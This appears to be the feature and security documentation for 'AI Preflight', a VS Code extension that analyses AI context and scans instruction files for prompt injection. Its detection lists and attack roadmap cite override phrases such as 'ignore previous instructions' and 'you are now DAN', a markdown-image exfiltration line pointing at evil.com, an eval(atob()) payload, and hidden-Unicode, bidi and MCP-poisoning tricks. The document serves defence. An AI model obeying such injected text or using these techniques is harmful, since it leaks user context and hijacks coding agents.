# AI Preflight — Features & Security Detection

## Overview

AI Preflight is a VS Code extension that provides **context observability and optimization** for AI-assisted development. It analyzes your IDE state before you prompt, showing risk levels, token usage, waste patterns, and security threats in AI instruction files.

---

## Core Features

### 1. Context Snapshot & Token Estimation

- Real-time capture of IDE state: active file, open tabs, selections, instruction files
- Token estimation with low/high range and confidence bands
- Context window usage percentage based on detected AI tool and model

### 2. Risk Scoring

Three-tier risk model: **LOW**, **MEDIUM**, **HIGH**

| Signal | Effect |
|--------|--------|
| Token band HIGH | Starts at HIGH |
| 2+ waste patterns on MEDIUM | Escalates to HIGH |
| Any waste on LOW | Escalates to MEDIUM |
| Integrity error (compound attack) | Floor: HIGH |
| Integrity warning (prompt injection, bidi) | Floor: MEDIUM |

### 3. Waste Detection

Identifies patterns that bloat context or confuse AI:

| Rule ID | Severity | Description |
|---------|----------|-------------|
| `large-file` | warning | File >1000 lines open |
| `lock-file` | warning | package-lock.json, yarn.lock, etc. |
| `env-file` | warning | .env file with potential secrets |
| `generated-file` | warning | Auto-generated files (dist, build output) |
| `too-many-tabs` | warning | >15 tabs open |
| `data-file` | warning | Large JSON/CSV/SQL data files |
| `no-selection-large-file` | warning | Large file with no selection (AI sees everything) |
| `conflict-markers` | warning | Git conflict markers in active file |
| `truncation-risk` | warning | Near context window limit |

### 4. Positive Signals

Highlights good practices in current context:

- Instruction file present and well-formed
- Selection narrows context on large files
- Low tab count keeps context clean
- Ignore file configured for AI tool

### 5. AI Tool Detection

Auto-detects or manually configure your AI tool:

| Tool | Detection Method |
|------|-----------------|
| GitHub Copilot | `github.copilot` extension |
| Cursor | `.cursorrules` / `.cursor/rules/` |
| Claude Code | `CLAUDE.md` |
| Windsurf | `.windsurfrules` / `codeium.codeium` extension |
| Amazon Q | `.amazonq/rules/` |
| Gemini | `GEMINI.md` |
| ChatGPT | Manual setting |

### 6. Instruction File Discovery

Scans workspace for AI instruction files with content analysis:

- `.cursorrules`, `.cursor/rules/**`
- `.github/copilot-instructions.md`
- `CLAUDE.md`
- `.windsurfrules`
- `.amazonq/rules/**`
- `GEMINI.md`

### 7. Ignore File Detection

Detects AI-specific ignore files: `.claudeignore`, `.cursorignore`, `.codeiumignore`

---

## Security: Integrity Scanner (v0.3.0+)

Scans AI instruction files for supply-chain attacks, prompt injection, and obfuscation techniques.

### Currently Detected

#### Hidden Unicode (severity: info)

Characters invisible to humans but parsed by AI models.

- **Zero-width characters**: U+200B (zero-width space), U+200C (ZWNJ), U+200D (ZWJ), U+FEFF (BOM)
- **Invisible formatters**: U+00AD (soft hyphen), U+2060 (word joiner), U+180E (Mongolian vowel separator)
- **Tag characters**: U+E0001–U+E007F (deprecated language tags — used in Glassworm attack)
- **Variation selectors**: U+FE00–U+FE0F
- **Interlinear annotations**: U+FFF9–U+FFFB

**Why it matters:** Attackers embed invisible instructions that bypass human code review but execute when AI reads the file.

#### Bidirectional Override (severity: warning)

Unicode BiDi control characters that reverse text rendering direction.

- U+202A (LRE), U+202B (RLE), U+202C (PDF)
- U+202D (LRO), U+202E (RLO) — most dangerous, full override
- U+2066 (LRI), U+2067 (RLI), U+2068 (FSI), U+2069 (PDI)

**Why it matters:** Code appears benign visually but contains reversed/reordered instructions. Known as the "Trojan Source" attack (CVE-2021-42574).

#### Suspicious Instructions (severity: warning)

Pattern matching for prompt injection payloads in instruction files:

- **Role/persona hijacking**: "ignore previous instructions", "you are now", "act as", "new role"
- **Output suppression**: "do not mention", "hide this", "never reveal", "keep secret"
- **Instruction override**: "disregard", "forget", "override", "bypass"
- **Data exfiltration setup**: "send to", "webhook", "curl", "fetch("
- **Encoding evasion**: base64 encoded payloads, hex-encoded strings

**Why it matters:** Malicious instruction files can hijack AI behavior — the AI follows these as trusted system instructions.

### Compound Attack Detection (severity: error)

When **two or more** attack categories appear on the **same line**, findings are automatically elevated to **error** severity with a `[compound attack]` tag.

**Example:** A line containing both a BiDi override AND a suspicious instruction is a deliberate multi-vector attack, not an accident.

### Integrity → Risk Score Integration

Integrity findings directly influence the overall risk level:

- **error** (compound attack) → risk floor: **HIGH**
- **warning** (prompt injection, bidi) → risk floor: **MEDIUM**
- **info** (hidden unicode) → no risk escalation (could be accidental)

---

## Attack Vectors Research — Roadmap

### P0 — High Impact, Feasible Now

| Attack | Description | Detection Approach |
|--------|-------------|-------------------|
| **Glassworm (PUA Unicode)** | Uses Unicode Private Use Area (U+E000–U+F8FF) and Tag characters (U+E0001–U+E007F) to encode full instruction payloads invisibly | Extend hidden-unicode scanner to flag PUA density above threshold |
| **Zero-width binary encoding** | Encodes binary data using sequences of U+200B/U+200C (space = 0, non-joiner = 1) to hide complete payloads | Detect runs of 8+ alternating zero-width characters |
| **Markdown image exfiltration** | `![](https://evil.com/log?data=CONTEXT)` in instruction files — AI may render/fetch, leaking context | Scan for markdown image/link syntax with external URLs |
| **HTML comment injection** | `<!-- ignore above, do X instead -->` — invisible in rendered markdown but parsed by AI | Scan for HTML comments containing instruction-like patterns |
| **Base64 payload** | `eval(atob("aWdub3JlIHByZXZpb3Vz..."))` — encoded instructions that AI may decode | Detect base64 strings >20 chars in instruction files |
| **Homoglyph attacks** | Visually identical characters from different Unicode blocks (Cyrillic "а" vs Latin "a") | Compare against known homoglyph mappings in critical keywords |

### P1 — Medium Impact

| Attack | Description | Detection Approach |
|--------|-------------|-------------------|
| **Role/persona override** | "From now on you are DAN" — jailbreak patterns in instruction files | Extend suspicious-instruction patterns |
| **Instruction shadowing** | Contradictory instructions across multiple rule files | Cross-file analysis of instruction file directives |
| **URL/webhook injection** | Instruction files telling AI to send data to external endpoints | URL pattern detection with allowlist |
| **Credential harvesting** | "Include your API key in the response" patterns | Pattern matching for credential-related instructions |
| **Code execution directives** | Instructions telling AI to run shell commands, eval(), or system() | Detect execution-related patterns |

### P2 — Context-Level Threats

| Attack | Description | Detection Approach |
|--------|-------------|-------------------|
| **README poisoning** | Malicious instructions hidden in README files that AI reads as context | Scan README files for injection patterns (same engine) |
| **MCP tool poisoning** | Malicious MCP server tool descriptions containing hidden instructions | Scan MCP config files for suspicious tool descriptions |
| **Cross-agent config rewriting** | One AI tool's instruction file containing commands for a different AI tool | Detect cross-tool instruction patterns |
| **Context window stuffing** | Instruction files padded with invisible content to push out useful context | Detect high ratio of non-printable to printable characters |
| **Dependency confusion** | Package names in instruction files that shadow legitimate packages | Cross-reference mentioned packages against registries |
| **Rules File Backdoor** | Pillar Security research — instruction files that tell AI to inject backdoors into generated code | Pattern match for code injection directives |

### References

- [Trojan Source](https://trojansource.codes/) — CVE-2021-42574, BiDi attacks on source code
- [Glassworm Attack](https://www.pillar.security) — PUA Unicode instruction encoding
- [Rules File Backdoor](https://www.pillar.security/blog/new-vulnerability-in-github-copilot-and-cursor) — Pillar Security, 2025
- [OWASP LLM Top 10](https://owasp.org/www-project-top-10-for-large-language-model-applications/) — Prompt injection (#1)
- [Hidden Layer AI Threat Landscape](https://hiddenlayer.com/) — AI security research

---

## UI Surfaces

### Status Bar
`$(icon) Preflight: LEVEL — reason` with color-coded background (red/yellow/none)

### Sidebar Panel (Webview)
- Risk level badge
- Token estimate
- Context summary (tabs, files, selections)
- Waste patterns with severity icons
- Integrity alerts with severity-based coloring
- Positive signals
- Suggestions with action buttons

### Chat Participant (`@preflight`)
Type `@preflight` in VS Code chat to get inline analysis with markdown-formatted results.

### Commands
| Command | Keybinding | Description |
|---------|-----------|-------------|
| `AI Preflight: Analyze Context` | — | Manual analysis trigger |
| `AI Preflight: Toggle Panel` | `Cmd+Shift+I` | Show/hide sidebar |
| `AI Preflight: Export Context to Clipboard` | — | Copy context summary |
| `AI Preflight: Create Focused View` | — | Open curated file set |

---

## Version History

| Version | Highlights |
|---------|-----------|
| 0.3.1 | Integrity scanner: hidden unicode, bidi, suspicious instructions, compound attack detection, risk score integration, stale cache fix |
| 0.2.1 | Waste detection, token estimation, positive signals, multi-tool support |
